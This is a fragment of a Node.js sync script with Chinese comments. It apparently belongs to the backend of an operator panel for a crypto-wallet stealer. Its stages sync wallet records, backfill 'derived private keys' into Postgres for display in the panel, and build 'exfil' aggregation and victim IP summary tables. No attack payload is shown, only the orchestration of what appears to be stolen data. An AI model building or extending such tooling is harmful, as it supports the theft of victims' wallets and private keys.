  //   面板"无钱包"错误显示（FFWFK4E5N72K 根因）。现改为逐阶段 try/catch，失败记录后继续。
  const stages = [];
  if (!ONLY || ONLY === 'wallet18') stages.push(['wallet18', () => syncWallet18(ipMap)]);
  if (!ONLY || ONLY === 'tindex') stages.push(['tindex', () => syncTIndex()]);
  if (!ONLY || ONLY === 'meta') stages.push(['meta', () => syncMetaOverrides()]);
  // devmeta：默认走 PG 直算（≤5 分钟级）；--only devmeta-snap 可回退旧「快照同步」路径
  if (ONLY === 'devmeta-snap') stages.push(['devmeta-snap', () => syncDeviceMeta()]);
  else if (!ONLY || ONLY === 'devmeta') stages.push(['devmeta', () => syncDeviceMetaPg(process.argv.includes('--dry'))]);
  if (!ONLY || ONLY === 'session') stages.push(['session', () => syncSessionStart()]);   // 【2026-09-14】上线时间落列（列表默认排序字段）
  if (!ONLY || ONLY === 'derived') stages.push(['derived', () => syncDerivedKeys()]);    // 【2026-09-14】派生私钥回填 PG（面板可见）
  if (!ONLY || ONLY === 'devip') stages.push(['devip', () => syncDeviceIps()]);
  if (!ONLY || ONLY === 'uploads') stages.push(['uploads', () => syncUploads()]);
  // 【2026-09-20】面板提速预聚合：exfil18 聚合表 / IP 汇总表（各 ~2-4s/轮，nice 10 后台）
  if (!ONLY || ONLY === 'exfilagg') stages.push(['exfilagg', () => syncExfilAgg()]);
  if (!ONLY || ONLY === 'ipsum') stages.push(['ipsum', () => syncIpSummary()]);
  const failed = [];
  for (const [name, fn] of stages) {
    try { await fn(); }
    catch (e) { failed.push(name); console.error(`[globals] 阶段 ${name} 失败（已隔离，继续后续阶段）:`, e); }
  }
  await pgStore.close();
  if (failed.length) { console.error(`[globals] 完成但有 ${failed.length} 个阶段失败: ${failed.join(', ')}`); process.exit(1); }
})().catch(e => { console.error('[globals] fatal', e); process.exit(1); });
